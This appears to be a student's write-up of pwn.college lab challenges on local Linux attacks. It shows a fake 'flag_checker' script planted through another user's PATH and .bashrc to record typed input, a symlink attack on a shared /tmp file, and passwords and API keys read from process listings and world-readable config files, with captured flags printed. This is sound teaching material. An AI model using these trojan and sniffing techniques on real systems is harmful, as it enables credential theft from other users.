# Sniffing Input

`.bashrc' is a file that is used for bash terminal personalization. On startup we will use the configuration file to trigger a malicious payload. By hijacking an existing command called flag_checker to read and print the password.

``` bash
#!/bin/bash
echo "Type the flag"
read flag
echo "$flag" >> /tmp/flag_capture
EOF
```
Was the fake `flag_checker` command that I wrote. Was inputted into the `/tmp` folder so that it could be accessible to all users

Then in **Zardus'** `.bashrc` file we exported the path so that he could detect the fake_flag and we could capture it 

# Overshared Directories
same program except instead of using /tmp folder we set all files and writes in zardus (world) directory

``` bash
#!/bin/bash
echo "Type the flag"
read flag
echo  "$flag" >> /home/zardus/flag_capture
echo "correct!"
```

and in the .bashrc we write:

`export PATH=/home/zardus:$PATH`

PS: Don't forget to set the fake flag_checker to be executable: 
`chmod +x /home/zardus/flag_checker` 

# Tricky Linking
sharing `/tmp/collab`

Will be triggering a `symlink attack` 

We create a link to **Zardus'** `.bashrc` file with the evil-commands.txt and from there we read the flag

Since while trying to add `cat /flag` to the list of evil commands he ended up unintentionally writing the command to his .bashrc and leaking the flag.

# Sniffing Process Arguments

We found the arguments directly from the running processes. This might be one of the cooler things we have done in this module

``` bash
hacker@shenanigans~sniffing-process-arguments:~$ ps aux
  USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
  root           1  0.0  0.0   1056   640 ?        Ss   17:01   0:00 /sbin/docker-init -- /nix/var/nix/profiles/dojo-workspace/bin/
  root           7  0.0  0.0   5412  2240 ?        S    17:01   0:00 /run/dojo/bin/sleep 6h
  root         123  0.0  0.0   4332  2560 ?        S    17:01   0:00 su -c auto.sh --user zardus --pass pw_607420995 zardus
  zardus       126  0.0  0.0   4752  2880 ?        Ss   17:01   0:00 /bin/bash /run/challenge/bin/auto.sh --user zardus --pass pw_6
  zardus       128  0.0  0.0 232424  3200 ?        S    17:01   0:00 sleep 6h
  hacker       141  0.0  0.0  37828 22080 ?        Sl   17:01   0:00 /nix/store/1far3iqcmb25wfnzwh41i3bmal1pwp2v-ttyd-1.7.7/bin/tty
  hacker       143  0.0  0.0 232068  4480 pts/0    Ss   17:01   0:00 /run/dojo/bin/bash --login
  hacker       156  0.0  0.0 234256  4160 pts/0    R+   17:02   0:00 ps aux

hacker@shenanigans~sniffing-process-arguments:~$ su zardus
  Password: 

zardus@shenanigans~sniffing-process-arguments:/home/hacker$ sudo cat /flag
  pwn.college{4DLzmpS22VJ1j-UNqFmP9mcf548.0FOzEzNxwiM5UzMzEzW}
```

Some random guy on stack exchange's words of wisdom:

"**Passing it via stdin is more secure, since arguments are visible in the process tree.**

Passing a secret value as an argument is typically more risky. Whenever something is passed as an argument, all other processes running under the same user (and sometimes all other users' processes, period) will be able to view the arguments for each process. This is why you can see arguments by running `ps aux`. Passing a value via stdin, on the other hand, sends it through a file descriptor. This descriptor will not be readable by unprivileged processes. If your threat model involves other malicious, local processes, you should send the sensitive material through stdin.

Passing data through stdin involves passing it through a file descriptor which the program can read using standard IO calls. In this case, it will be just as secure as opening a file to read from it. Command line arguments, on the other hand, are kept in a process' `argv` in memory. A program simply has to access that address of memory to view the arguments. This data is, however, visible to other users via that process' `/proc/<pid>/cmdline`. This is actually also the case for environmental variables, so passing secrets through the environment is not a good idea either."

# Snooping on Configurations
`.bashrc` is by default world readable unless explicitly changed.

`cat /home/zardus/.bashrc`

at the bottom of the config file you find 

``` bash
FLAG_GETTER_API_KEY=sk-139923018

hacker@shenanigans~snooping-on-configurations:~$ flag_getter --key sk-139923018
  Correct API key! Do you want me to print the flag (y/n)?
  y
  pwn.college{og0VQezAVDwvd9iuZp5_EVrV8Dl.0lM0EzNxwiM5UzMzEzW}
```


